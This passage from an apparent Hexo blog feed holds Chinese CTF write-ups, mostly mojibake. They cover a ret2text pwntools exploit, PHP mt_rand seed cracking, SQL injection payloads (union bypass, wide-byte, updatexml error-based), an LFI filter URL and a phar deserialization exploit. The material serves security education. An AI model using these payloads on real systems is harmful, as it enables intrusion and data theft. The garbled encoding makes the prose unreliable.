ï¼š</p><p>mainå‡½æ•°ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040078c &lt;+145&gt;:lea    rax,[rbp-0x4]</span><br><span class="line">   0x0000000000400790 &lt;+149&gt;:mov    rsi,rax</span><br><span class="line">   0x0000000000400793 &lt;+152&gt;:mov    edi,0x400961</span><br><span class="line">   0x0000000000400798 &lt;+157&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000040079d &lt;+162&gt;:call   0x4005d0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x00000000004007a2 &lt;+167&gt;:mov    edi,0x400964</span><br><span class="line">   0x00000000004007a7 &lt;+172&gt;:call   0x400580 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004007ac &lt;+177&gt;:mov    edx,DWORD PTR [rbp-0x4]   &#x2F;&#x2F;ä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•°å€¼ç»™edx</span><br><span class="line">   0x00000000004007af &lt;+180&gt;:lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004007b3 &lt;+184&gt;:mov    rsi,rax    &#x2F;&#x2F;ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°å€¼ç»™rsi</span><br><span class="line">   0x00000000004007b6 &lt;+187&gt;:mov    edi,0x0    &#x2F;&#x2F;ä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°å€¼ç»™edi</span><br><span class="line">   0x00000000004007bb &lt;+192&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000004007c0 &lt;+197&gt;:call   0x4005a0 &lt;read@plt&gt;</span><br><span class="line">   0x00000000004007c5 &lt;+202&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000004007ca &lt;+207&gt;:leave  </span><br><span class="line">   0x00000000004007cb &lt;+208&gt;:ret</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(sys.argv[1], sys.argv[2])</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(&quot;.&#x2F;ret2text&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;name:\n&quot;,str(50))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x18 + p64(0x0000000004006E6)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;name?\n&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnåŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ’æ¯ä¸¨æ–°æ˜¥ç¥ˆç¦èµ›</title>
      <link href="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/"/>
      <url>/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x-01-æ¯ç‡¥çš„æŠ½å¥–"><a href="#0x-01-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="0x 01 æ¯ç‡¥çš„æŠ½å¥–"></a>0x 01 æ¯ç‡¥çš„æŠ½å¥–</h3><ul><li><p>æ¥æº</p><p>GWCTF2019</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>è®¿é—®check.phpå¾—åˆ°æºä»£ç </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;seed&#39;]))&#123;</span><br><span class="line">$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#39;seed&#39;]);</span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show &#x3D; substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;num&#39;]))&#123;</span><br><span class="line">    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;);</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä»£ç å¯çŸ¥æ˜¯ä½¿ç”¨mt_srand()ç”Ÿæˆ20ä½éšæœºæ•°ï¼Œå¹¶ä¸”çŸ¥é“éšæœºæ•°çš„å‰10ä½</p><ol start="2"><li>è¿™æ—¶æˆ‘ä»¬å¯ä»¥ç”¨åˆ°ä¸€æ¬¾å·¥å…·<strong>php_mt_seed*</strong>ï¼ˆPHP mt_randï¼ˆï¼‰ç§å­ç ´è§£ç¨‹åºï¼‰*</li></ol><p>å…·ä½“è§£æ³•æ˜¯å…ˆç”¨è„šæœ¬å°†ä¼ªéšæœºæ•°è½¬æ¢æˆphp_mt_seedå¯ä»¥è¯†åˆ«çš„æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;RymjbZRSUv&#39;</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print res</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;output:</span><br><span class="line">53 53 0 61 24 24 0 61 12 12 0 61 9 9 0 61 1 1 0 61 61 61 0 61 53 53 0 61 54 54 0 61 56 56 0 61 21 21 0 61</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<a href="https://www.openwall.com/php_mt_seed/çˆ†ç ´å‡ºç§å­" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/çˆ†ç ´å‡ºç§å­</a></p><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128105021483.png" alt></p><p>æˆ‘ä»¬å³å¯å¾—åˆ°æ»¡è¶³æ¡ä»¶çš„seed:<br>    seed = 0x29c11047 = 700518471 (PHP 7.1.0+)<br> çˆ†ç ´å‡ºä¼ªéšæœºæ•°å’Œphpç‰ˆæœ¬.</p><ol start="3"><li>ç„¶åæ”¹å†™æºç ï¼Œç”Ÿæˆå®Œæ•´å­—ç¬¦ä¸²</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(700518471);</span><br><span class="line"></span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="0x-02-BabySqli"><a href="#0x-02-BabySqli" class="headerlink" title="0x 02 BabySqli"></a>0x 02 BabySqli</h3><ul><li><p>æ¥æº</p><p>GXYCTF2019</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>é¢˜ç›®æç¤ºäº†ç”¨md5åšå“ˆå¸Œï¼Œfuzzå¯ä»¥çŸ¥é“adminæ˜¯è´¦å·ã€‚é¢˜ç›®è¿‡æ»¤äº†å°æ‹¬å·ã€orå’Œ=ï¼Œæ²¡æœ‰è¿‡æ»¤unionï¼Œç”¨unionä¸‡èƒ½å¯†ç ç»•è¿‡å³å¯</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># username:</span><br><span class="line">-1&#39; union select 1, &#39;admin&#39;, &#39;202cb962ac59075b964b07152d234b70&#39; #</span><br><span class="line"># password:</span><br><span class="line">123</span><br></pre></td></tr></table></figure><h3 id="0x-03-BabySqli-2"><a href="#0x-03-BabySqli-2" class="headerlink" title="0x 03 BabySqli 2"></a>0x 03 BabySqli 2</h3><ul><li><p>æ¥æº</p><p>GXYCTF2019</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>é¢˜ç›®æç¤ºäº†æ”¯æŒä¸­æ–‡ï¼Œå°±å¯ä»¥æƒ³åˆ°å®½å­—èŠ‚ï¼Œç™»é™†ä¹‹åå‘ç°æœ‰ä¸€ä¸ªæ˜¾ç¤ºä½ï¼Œå¯ä»¥é€šè¿‡è”åˆæŸ¥è¯¢å¾—åˆ°flag</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®è€ƒç‚¹å’Œè¿‡æ»¤ï¼š</span><br><span class="line">å®½å­—èŠ‚æ³¨å…¥ï¼Œè¿‡æ»¤0xï¼Œunion select whereç½®ç©º</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºdatabase</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),database()%23&amp;pw&#x3D;1</span><br><span class="line"># å¾—åˆ°æ•°æ®åº“åä¸ºweb_sqli</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºè¡¨å</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),group_concat(table_name)%20from%20information_schema.tables%20whwhereere%20table_schema&#x3D;database()%23&amp;pw&#x3D;1</span><br><span class="line"># å¾—åˆ°è¡¨åä¸ºf14g,user</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºf14gåˆ—å</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),group_concat(column_name)%20from%20information_schema.columns%20whwhereere%20table_name%20&#x3D;%20char(102,49,52,103)%23&amp;pw&#x3D;1</span><br><span class="line"># å¾—åˆ°f14gåˆ—åä¸ºb80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</span><br><span class="line"></span><br><span class="line"># æ‹¿åˆ°flag</span><br><span class="line">name&#x3D;1%df%27ununionion%20selselectect%201,char(97,100,109,105,110),327a6c4304ad5938eaf0efb6cc3e53dc%20from%20f14g%20limit%2022,1%23&amp;pw&#x3D;1</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># æ˜¾ç¤ºdatabase</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,database()),1)%20--+&amp;pw&#x3D;1</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºè¡¨å</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,(seSELECTlect%20group_concat(table_name)%20from%20information_schema.tables%20whWHEREere%20table_schema&#x3D;database()%20limit%200,1)),1)%20--+&amp;pw&#x3D;1</span><br><span class="line"># Error: XPATH syntax error: &#39;f14g,user&#39; </span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºf14gåˆ—å</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,%20(seSELECTlect%20group_conca</span><br><span class="line">t(column_name)%20from%20information_schema.columns%20wherWHEREe%20TABLE_NAME</span><br><span class="line">&#x3D;char(102,49,52,103))),1)%20--+&amp;pw&#x3D;1</span><br><span class="line"># Error: XPATH syntax error: &#39;b80bb7740288fda1f201890375a60c8f&#39; </span><br><span class="line"></span><br><span class="line"># æŸ¥å­—æ®µ</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,(seleSELECTct%20concat(327a6c4304ad5938eaf0efb6cc3e53dc)%20from%20f14g%20limit%200,1),1),1)%20--+%20&amp;pw&#x3D;y1ng</span><br><span class="line"># Error: XPATH syntax error: &#39;VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr&#39; </span><br><span class="line"></span><br><span class="line"># æŸ¥flag</span><br><span class="line">name&#x3D;admin%df%27%20and%20updatexml(1,concat(1,(seleSELECTct%20concat(327a6c4304ad5938eaf0efb6cc3e53dc)%20from%20f14g%20limit%2022,1),1),1)%20--+%20&amp;pw&#x3D;1</span><br><span class="line"># Error: XPATH syntax error: &#39;R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0&#39; </span><br><span class="line"># å› ä¸º updatexml è¿”å›æœ€å¤§é•¿åº¦å°±æ˜¯32ï¼Œè¶…è¿‡32ä½çš„è¢«ä¸¢å¼ƒäº†ï¼Œæ‰€ä»¥ä¸Šé¢æ— è®ºæ˜¯æ­Œè¯è¿˜æ˜¯flagï¼Œbase64éƒ½ç»å¸¸ç¼ºä¸ªå°¾</span><br><span class="line"># substr() å¯ä»¥æŒ‡å®šä»å­—ç¬¦ä¸²çš„æŸä¸ªä½ç½®å¼€å§‹ï¼Œè¿”å›è‡ªå®šä¹‰é•¿åº¦ï¼š</span><br><span class="line">name&#x3D;admin%df%27 and updatexml(1,concat(1, substr((seleSELECTct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)),1) --+ &amp;pw&#x3D;11</span><br><span class="line">å¾—åˆ°ååŠéƒ¨åˆ†ï¼Œæ‹¼æ¥å¾—åˆ°flag</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.colabug.com/2019/1225/6768296/amp/" target="_blank" rel="noopener">https://www.colabug.com/2019/1225/6768296/amp/</a></p><h3 id="0x-04-Babysqliv3-0"><a href="#0x-04-Babysqliv3-0" class="headerlink" title="0x 04 Babysqliv3.0"></a>0x 04 Babysqliv3.0</h3><ul><li><p>æ¥æº</p><p>GXYCTF2019</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>åœ¨ç™»å½•é¡µæŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°<code>&lt;!-- u9db8 --&gt;</code>ï¼Œå¯ä»¥ç”¨Unicodeè§£ç å¾—åˆ°é¶¸ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªå¼±å£ä»¤ï¼Œå¹¶ä¸æ˜¯æ³¨å…¥é¢˜ï¼Œç”¨å¼±å£ä»¤å­—å…¸å¯ä»¥è·‘å‡ºæ¥ï¼Œè´¦å·å£ä»¤æ˜¯admin/passwordï¼Œå³å¯æˆåŠŸç™»é™†</li><li>ç™»é™†å‘ç°æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œç®€å•æ“ä½œåå‘ç°åªèƒ½ä¸Šä¼ txtæ–‡ä»¶ï¼›ç„¶åå‘ç°urlé‡Œæœ‰å¼•ç”¨ï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨LFI(Local File Include)ï¼Œä½¿ç”¨filteråè®®å¯ä»¥çœ‹ç½‘ç«™æºç ã€‚</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10009&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure><p>home.phpæºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;ä¸Šä¼ &quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">public $Filename;</span><br><span class="line">public $cmd;</span><br><span class="line">public $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function __construct()&#123;</span><br><span class="line">$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">@mkdir($sandbox, 0777, true);</span><br><span class="line">if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upload($file)&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (â€²â–½&#96;ã€ƒ)&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __toString()&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line">&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">return $this-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">eval($this-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">$uploader &#x3D; new Uploader();</span><br><span class="line">$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">if(@file_get_contents($uploader))&#123;</span><br><span class="line">echo &quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo file_get_contents($uploader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å®˜æ–¹è§£æ³•ï¼š</p><p>åªè¦æ„é€ ä¸€ä¸ªpharååºåˆ—åŒ–æ–‡ä»¶ï¼Œå°†å‘½ä»¤æ›¿æ¢ä¸ºgetflagæ“ä½œï¼Œå†æŠŠæ£€æŸ¥çš„tokenæ›¿æ¢ä¸ºæœåŠ¡å™¨åˆ†å‘çš„ï¼Œæœ€åæ§åˆ¶æ–‡ä»¶åè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># ä½¿ç”¨æ—¶è¯·å°†ä¸Šæ–‡ä¸­çš„å¯¹è±¡ä»£ç ç²˜è´´åˆ°æœ¬ä»£ç ä¹‹å‰</span><br><span class="line">&lt;?php</span><br><span class="line">@unlink(&quot;exp.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub</span><br><span class="line">$o &#x3D; new Uploader();</span><br><span class="line">$o-&gt;token &#x3D; &quot;GXYb4b627c1236f2c1b9463e18e0e7bfe30&quot;;</span><br><span class="line">$o-&gt;cmd &#x3D; &quot;echo file_get_contents(&#39;.&#x2F;flag.php&#39;);&quot;;</span><br><span class="line">$o-&gt;Filename &#x3D;</span><br><span class="line">&quot;phar:&#x2F;&#x2F;uploads&#x2F;909c00f0b41f82ef8c579546b5ed765e&#x2F;GXYb4b627c1236f2c1b9463e18e</span><br><span class="line">0e7bfe30.txt&quot;;</span><br><span class="line">$phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;a&quot;, &quot;a&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%A8%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/image-20200128134233300.png" 